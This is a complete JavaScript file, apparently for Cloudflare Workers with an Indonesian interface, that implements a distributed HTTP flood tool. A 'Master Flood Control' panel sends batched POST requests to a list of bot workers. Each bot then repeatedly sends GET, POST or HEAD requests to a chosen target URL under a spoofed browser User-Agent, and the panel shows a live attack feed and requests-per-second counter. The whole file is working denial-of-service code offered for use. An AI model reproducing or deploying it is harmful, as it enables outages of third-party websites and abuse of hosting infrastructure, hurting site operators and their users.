/**
 * HTTP Flood Control v4
 * Tema biru muda + layar kecil live attack (mobile-friendly, ringan)
 */

const BOT_HTML = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Flood Bot</title>
<style>
body{font-family:system-ui;background:#e8f4fc;color:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{background:#fff;border:1px solid #bae6fd;border-radius:16px;padding:32px;text-align:center;max-width:360px;box-shadow:0 10px 25px rgba(14,165,233,.12)}
h1{font-size:1.35rem;margin-bottom:8px;color:#0284c7}.sub{color:#64748b;font-size:.9rem}
</style>
</head>
<body>
<div class="card">
<h1>Flood Bot Active</h1>
<p class="sub">Worker siap menerima perintah dari Master.<br>Jangan buka langsung.</p>
</div>
</body>
</html>`;

const MASTER_HTML = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Master Flood Control</title>
<style>
:root{
  --bg:#e8f4fc;
  --card:#ffffff;
  --border:#bae6fd;
  --accent:#0ea5e9;
  --accent2:#0284c7;
  --text:#0f172a;
  --muted:#64748b;
  --ok:#10b981;
  --err:#ef4444;
  --warn:#f59e0b;
  --livebg:#f0f9ff;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:16px;display:flex;align-items:flex-start;justify-content:center}
.wrap{width:100%;max-width:680px}
.card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:22px 18px;box-shadow:0 10px 30px rgba(14,165,233,.1)}
h1{font-size:1.35rem;font-weight:700;color:var(--accent2);margin-bottom:4px}
.sub{color:var(--muted);font-size:.85rem;margin-bottom:18px;line-height:1.4}
label{display:block;font-size:.72rem;font-weight:600;color:var(--muted);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em}
input,textarea,select{width:100%;background:#f8fafc;border:1px solid var(--border);border-radius:10px;padding:11px 12px;color:var(--text);font-size:.9rem;margin-bottom:12px}
textarea{min-height:90px;resize:vertical;font-family:ui-monospace,monospace;font-size:.8rem}
input:focus,textarea:focus,select:focus{outline:none;border-color:var(--accent);background:#fff}
.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
.btns{display:flex;gap:8px;margin:6px 0 14px}
button{flex:1;padding:13px;border:none;border-radius:10px;font-size:.9rem;font-weight:600;cursor:pointer}
#btnStart{background:var(--accent);color:#fff}
#btnStart:disabled{opacity:.45;cursor:not-allowed}
#btnStop{background:transparent;border:1px solid var(--err);color:var(--err)}
#btnStop:disabled{opacity:.35;cursor:not-allowed}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
.stat{background:var(--livebg);border:1px solid var(--border);border-radius:10px;padding:10px 6px;text-align:center}
.stat b{display:block;font-size:1.15rem;font-weight:700;color:var(--accent2);margin-bottom:2px}
.stat span{font-size:.65rem;color:var(--muted);text-transform:uppercase}

/* Layar kecil live attack - khusus mobile, ringan */
.live-screen{
  background:#0c4a6e;
  border-radius:12px;
  padding:10px 12px;
  margin-bottom:12px;
  height:110px;
  overflow:hidden;
  position:relative;
  font-family:ui-monospace,monospace;
  font-size:.72rem;
  color:#7dd3fc;
  line-height:1.45;
}
.live-screen .title{
  color:#38bdf8;
  font-size:.68rem;
  font-weight:600;
  margin-bottom:4px;
  letter-spacing:.03em;
}
.live-feed{
  height:78px;
  overflow:hidden;
}
.live-feed div{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.live-ok{color:#4ade80}.live-err{color:#f87171}.live-info{color:#7dd3fc}

.log{background:#f8fafc;border:1px solid var(--border);border-radius:10px;height:160px;overflow-y:auto;padding:10px 12px;font-family:ui-monospace,monospace;font-size:.75rem;line-height:1.45}
.log div{margin-bottom:2px}
.ok{color:var(--ok)}.err{color:var(--err)}.info{color:var(--muted)}.warn{color:var(--warn)}
.status{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:.8rem;color:var(--muted)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--muted)}
.dot.on{background:var(--ok);box-shadow:0 0 8px var(--ok);animation:pulse 1.1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
@media(max-width:560px){.grid3{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
</style>
</head>
<body>
<div class="wrap">
<div class="card">
<h1>Master Flood Control</h1>
<p class="sub">Satu panel kendalikan banyak bot. Tema biru muda + layar live ringan.</p>

<label>Daftar Bot Worker (satu baris satu URL)</label>
<textarea id="bots" placeholder="https://bot1.xxx.workers.dev\nhttps://bot2.xxx.workers.dev"></textarea>

<label>Target URL</label>
<input type="url" id="target" placeholder="https://target.com">

<div class="grid3">
<div><label>Method</label>
<select id="method"><option>GET</option><option>POST</option><option>HEAD</option></select></div>
<div><label>Concurrency/bot</label>
<input type="number" id="conc" value="15" min="1" max="30"></div>
<div><label>Durasi (detik)</label>
<input type="number" id="dur" value="20" min="5" max="60"></div>
</div>

<div class="btns">
<button id="btnStart">Mulai Semua Bot</button>
<button id="btnStop" disabled>Stop</button>
</div>

<!-- Layar kecil live attack -->
<div class="live-screen">
  <div class="title">LIVE ATTACK FEED</div>
  <div class="live-feed" id="live"></div>
</div>

<div class="stats">
<div class="stat"><b id="sBot">0</b><span>Bot</span></div>
<div class="stat"><b id="sSent">0</b><span>Terkirim</span></div>
<div class="stat"><b id="sOk">0</b><span>Sukses</span></div>
<div class="stat"><b id="sRps">0</b><span>RPS</span></div>
</div>

<div class="log" id="log"></div>

<div class="status"><div class="dot" id="dot"></div><span id="stxt">Siap</span></div>
</div>
</div>

<script>
const $ = id => document.getElementById(id);
let running = false;
let liveCount = 0;

function log(msg, cls='info'){
  const d=document.createElement('div');
  d.className=cls;
  d.textContent='['+new Date().toLocaleTimeString('id-ID',{hour12:false})+'] '+msg;
  $('log').appendChild(d);
  if($('log').children.length>40)$('log').removeChild($('log').firstChild);
  $('log').scrollTop=$('log').scrollHeight;
}

function live(msg, cls='live-info'){
  const d=document.createElement('div');
  d.className=cls;
  d.textContent=msg;
  $('live').appendChild(d);
  liveCount++;
  if(liveCount>8){
    $('live').removeChild($('live').firstChild);
    liveCount--;
  }
}

function setStatus(on,text){
  $('dot').classList.toggle('on',on);
  $('stxt').textContent=text;
}

function getBots(){
  return $('bots').value.split('\n').map(s=>s.trim()).filter(s=>s.startsWith('http'));
}

async function start(){
  const bots = getBots();
  const target = $('target').value.trim();
  if(bots.length===0){log('Masukkan minimal 1 URL bot','err');return;}
  if(!target.startsWith('http')){log('Target URL tidak valid','err');return;}

  const method = $('method').value;
  const conc = Math.min(30,Math.max(1,+$('conc').value||15));
  const dur = Math.min(60,Math.max(5,+$('dur').value||20));

  running = true;
  $('btnStart').disabled=true;
  $('btnStop').disabled=false;
  $('log').innerHTML='';
  $('live').innerHTML='';
  liveCount=0;
  $('sBot').textContent=bots.length;
  $('sSent').textContent=0; $('sOk').textContent=0; $('sRps').textContent=0;

  setStatus(true,'Menyerang dengan '+bots.length+' bot');
  log('Target: '+target,'info');
  log('Bot: '+bots.length+' | Conc/bot: '+conc+' | Durasi: '+dur+'s','info');
  live('>> ATTACK STARTED','live-ok');

  const t0 = Date.now();
  const end = t0 + dur*1000;
  let sent=0, ok=0;

  const workers = bots.map(async (botUrl, idx) => {
    const base = botUrl.replace(/\/$/, '');
    const botName = 'bot'+(idx+1);
    while(running && Date.now()<end){
      const batch = [];
      for(let i=0;i<conc;i++){
        batch.push(
          fetch(base+'/attack',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({url:target,method})
          }).then(r=>{
            sent++;
            if(r.ok || (r.status>=200&&r.status<500)) ok++;
            $('sSent').textContent=sent;
            $('sOk').textContent=ok;
            const elapsed=(Date.now()-t0)/1000;
            $('sRps').textContent=elapsed>0?Math.round(sent/elapsed):0;
            if(sent%7===0) live(botName+' → '+ (r.status||'?') +' | total '+sent, r.ok?'live-ok':'live-err');
          }).catch(()=>{
            sent++;
            $('sSent').textContent=sent;
            if(sent%7===0) live(botName+' → fail | total '+sent,'live-err');
          })
        );
      }
      await Promise.all(batch);
    }
  });

  await Promise.all(workers);

  running=false;
  $('btnStart').disabled=false;
  $('btnStop').disabled=true;
  setStatus(false,'Selesai');
  live('>> ATTACK FINISHED','live-ok');
  log('Selesai. Terkirim: '+sent+' | Sukses: '+ok,'ok');
}

$('btnStart').onclick=start;
$('btnStop').onclick=()=>{
  running=false;
  $('btnStart').disabled=false;
  $('btnStop').disabled=true;
  setStatus(false,'Dihentikan');
  live('>> STOPPED','live-err');
  log('Dihentikan manual','warn');
};
</script>
</body>
</html>`;

export default {
  async fetch(request, env, ctx) {
    const u = new URL(request.url);
    const mode = u.searchParams.get('mode') || 'bot';

    if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '') && mode === 'master') {
      return new Response(MASTER_HTML, {
        headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
      });
    }

    if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '')) {
      return new Response(BOT_HTML, {
        headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
      });
    }

    if (request.method === 'POST' && u.pathname === '/attack') {
      try {
        const body = await request.json();
        const target = (body.url || '').trim();
        const method = (body.method || 'GET').toUpperCase();

        if (!target.startsWith('http')) {
          return new Response('bad url', { status: 400 });
        }

        const ctrl = new AbortController();
        const to = setTimeout(() => ctrl.abort(), 8000);

        const opts = {
          method,
          signal: ctrl.signal,
          redirect: 'follow',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache'
          }
        };

        if (method === 'POST') {
          opts.body = JSON.stringify({ t: Date.now(), n: Math.random() });
          opts.headers['Content-Type'] = 'application/json';
        }

        const res = await fetch(target, opts);
        clearTimeout(to);
        return new Response(null, { status: res.status });
      } catch (e) {
        return new Response(null, { status: 502 });
      }
    }

    return new Response('Not Found', { status: 404 });
  }
};
